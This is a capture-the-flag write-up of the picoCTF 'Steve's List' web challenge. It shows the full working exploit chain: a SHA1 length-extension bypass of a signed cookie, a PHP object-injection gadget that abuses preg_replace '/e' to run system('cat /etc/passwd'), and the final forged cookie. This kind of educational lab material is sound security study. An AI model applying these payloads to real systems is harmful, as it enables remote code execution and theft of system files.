### Solved by Swappage

Steve's List was a 200 points master challenge mostly focused on web exploitation, but also with a little of crypto inside.

The problem stated

![](/images/2014/pico/steveslist/problem.png)

So we were playing with a defaced website, we had the web server, a backup archive containing the source for a white box analysis and a flag to read.

<!-- more -->

I started looking at the source code, and a couple of things turned out looking really interesting.

Let's start with the cookie.php page, which is the page that actually has the vuln:

```php
	<?php
	  if (isset($_COOKIE['custom_settings'])) {
		// We should verify to make sure this thing is legit.
		$custom_settings = urldecode($_COOKIE['custom_settings']);
		$hash = sha1(AUTH_SECRET . $custom_settings);
		if ($hash !== $_COOKIE['custom_settings_hash']) {
		  die("Why would you hack Section Chief Steve's site? :(");
		}
		// we only support one setting for now, but we might as well put this in.
		$settings_array = explode("\n", $custom_settings);
		$custom_settings = array();
		for ($i = 0; $i < count($settings_array); $i++) {
		  $setting = $settings_array[$i];
		  $setting = unserialize($setting);
		  $custom_settings[] = $setting;
		}
	  } else {
		$custom_settings = array(0 => true);
		setcookie('custom_settings', urlencode(serialize(true)), time() + 86400 * 30, "/");
		setcookie('custom_settings_hash', sha1(AUTH_SECRET . serialize(true)), time() + 86400 * 30, "/");
	  }
	?>
```

As we can see, the vuln here is pretty clear: there is a deserialization of an object that is specified in a cookie value.
What happens here is that the value of the cookie is splitted on the "\n" character, and each value is put in an array and then the function unserialize() is invoked on that value.

As we will see later, this will allow us to gain remote code execution on the server, but unfortunately, for now there is something really annoying that is preventing us from reaching the exploitable branch of code.

In fact at line 5 the cookie value is appended to an AUTH_SECRET value, and a sha1 hash of the resulting concatenation is checked against another cookie, named custom_settings_hash
which is set the first time we visit the site by the code from line from 19 to 21 of the cookie.php page.

the AUTH_SECRET value is statically defined in another php page, where all the static variables are set: root_data.php

```php
	<?php
	  define('STEVES_LIST_ABSOLUTE_INCLUDE_ROOT', dirname(__FILE__) . "/");
	  define('STEVES_LIST_TEMPLATES_PATH', dirname(__FILE__) . "/templates/");
	  define('DISPLAY_POSTS', 0);
	  // Daedalus changed this... I guess AAAAAAAA was not a good secret :(
	  define('AUTH_SECRET', "AAAAAAAA");
	  require_once(STEVES_LIST_ABSOLUTE_INCLUDE_ROOT . "includes/classes.php");
	?>
```

In our local backup, the static value is set to AAAAAAAA, but on the remote server the "hackers" from daedalus corp modified that value to prevent us from taking back the control of the web site.

And here is where crypto comes in play: yes, because there is an attack. known as *length extension attack* that allows us to bypass the above verification issue.

The attack can be performed with all the hashes where the function is H(secret.message) and where the message and the length of the secret are known.

We know already that the value of AUTH_SECRET is fixed to 8 characters, so we can abuse the length extension attack to append extra data to the custom_settings cookie.

Before performing this attack, we were bound to a fixed value in the custom_settings cookie, that was

	b:1;
	
which is the serialization of a true statement

```php
	serialize(true)
```

but now we can predict the hash that will result by padding that value and appending extra data, so we can append a \n followed by another serialized object that would eventually be deserialized after the check was successfully passed.

Using a python library for implementing the Length extension attack: hlextend i was able to build a simple payload that would bypass the validation; for now let's be happy i was able to inject test.

![](/images/2014/pico/steveslist/hashbypass.png)

Once the problem of bypassing the hash validation was solved, I had to find a way to gain code execution.
Doing that on the remote server would have been a little too much of a frustration, so i decided to create a local instance using the website backup, and by tweaking the code a bit, try to build a working object that would allow to gain code execution.

after looking at the source code of the class.php a little closer, I found that the Post class would be the perfect object to serialize and inject; 

```php
	class Post {
		protected $title;
		protected $text;
		protected $filters;
		function __construct($title, $text, $filters) {
			$this->title = $title;
			$this->text = $text;
			$this->filters = $filters;
	}

```

the class accepts 3 parameters in the constructor

- title
- text
- filter

where title is a string, text is also a string, while filter is an array of objects from the Filter class.

```php
	class Filter {
		protected $pattern;
		protected $repl;
		function __construct($pattern, $repl) {
		  $this->pattern = $pattern;
		  $this->repl = $repl;
		}
		function filter($data) {
		  return preg_replace($this->pattern, $this->repl, $data);
		}
	};
```

And how convenient, because the Filter class makes a good use of the preg_replace() function! This is really good, because considering we are in control of the object, we can forge the regular expressions for the Filter object, and this allows us, to create a regexp that instead of replacing, would execute our substitution payload.

To build the object i created this simple PHP snipplet:

```php
<?php

class Filter {
    protected $pattern;
    protected $repl;

    function __construct($pattern, $repl) {
      $this->pattern = $pattern;
      $this->repl = $repl;
    }
    function filter($data) {
      return preg_replace($this->pattern, $this->repl, $data);
    }

}

$filterobject = [new Filter("/test/e", "system('cat /etc/passwd');")];

class Post
{
   protected $title = "test";
   protected $text = "test";
   protected $filters;

   function __construct() {
        global $filterobject;
        $this->filters = $filterobject;
   }

}

print  "\n".serialize(new Post));
```

saved the output to a file (because the serialized objects may contain non printable characters
URL encoded it, and tried to send it to my local server.

The result was the following

![](/images/2014/pico/steveslist/injected.png)

Ok, now i had an object that would allow me to execute arbitrary code on the remote server.

I replaced the payload with a cat /home/daedalus/flag.txt and used the following python snipplet to calculate the hash and produce proper padding

```python
	#!/usr/bin/python

	import sys
	import struct
	import hlextend
	import urllib

	object = ""

	with open("rawcookie.bin", "rb") as f:
		byte = f.read(1)
		while byte != "":
			object += byte
			byte = f.read(1)

	print object

	sha = hlextend.new('sha1')

	meh = sha.extend(object, 'b:1;', 8, '2141b332222df459fd212440824a35e63d37ef69')

	print meh

	print sha.hexdigest()
```

here is an hex representation of the custom_settings cookie without URL encoding

	00000000  0a 4f 3a 34 3a 22 50 6f  73 74 22 3a 33 3a 7b 73  |.O:4:"Post":3:{s|
	00000010  3a 38 3a 22 00 2a 00 74  69 74 6c 65 22 3b 73 3a  |:8:".*.title";s:|
	00000020  34 3a 22 74 65 73 74 22  3b 73 3a 37 3a 22 00 2a  |4:"test";s:7:".*|
	00000030  00 74 65 78 74 22 3b 73  3a 34 3a 22 74 65 73 74  |.text";s:4:"test|
	00000040  22 3b 73 3a 31 30 3a 22  00 2a 00 66 69 6c 74 65  |";s:10:".*.filte|
	00000050  72 73 22 3b 61 3a 31 3a  7b 69 3a 30 3b 4f 3a 36  |rs";a:1:{i:0;O:6|
	00000060  3a 22 46 69 6c 74 65 72  22 3a 32 3a 7b 73 3a 31  |:"Filter":2:{s:1|
	00000070  30 3a 22 00 2a 00 70 61  74 74 65 72 6e 22 3b 73  |0:".*.pattern";s|
	00000080  3a 37 3a 22 2f 74 65 73  74 2f 65 22 3b 73 3a 37  |:7:"/test/e";s:7|
	00000090  3a 22 00 2a 00 72 65 70  6c 22 3b 73 3a 33 38 3a  |:".*.repl";s:38:|
	000000a0  22 73 79 73 74 65 6d 28  27 63 61 74 20 2f 68 6f  |"system('cat /ho|
	000000b0  6d 65 2f 64 61 65 64 61  6c 75 73 2f 66 6c 61 67  |me/daedalus/flag|
	000000c0  2e 74 78 74 27 29 3b 22  3b 7d 7d 7d              |.txt');";}}}|


the resulting cookies content for the submission to the vulnerable page were respectively:

	custom_settings_hash: 13c0bac46fcbd453c5052bce1d2f9ad6c88fe2bc

	vustom_settings: b:1%3b%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%60%0AO%3A4%3A%22Post%22%3A3%3A%7Bs%3A8%3A%22%00%2A%00title%22%3Bs%3A4%3A%22test%22%3Bs%3A7%3A%22%00%2A%00text%22%3Bs%3A4%3A%22test%22%3Bs%3A10%3A%22%00%2A%00filters%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A6%3A%22Filter%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00pattern%22%3Bs%3A7%3A%22%2Ftest%2Fe%22%3Bs%3A7%3A%22%00%2A%00repl%22%3Bs%3A38%3A%22system%28%27cat+%2Fhome%2Fdaedalus%2Fflag.txt%27%29%3B%22%3B%7D%7D%7D

and they resulted in the flag being correctly retrieved

![](/images/2014/pico/steveslist/flag.png)

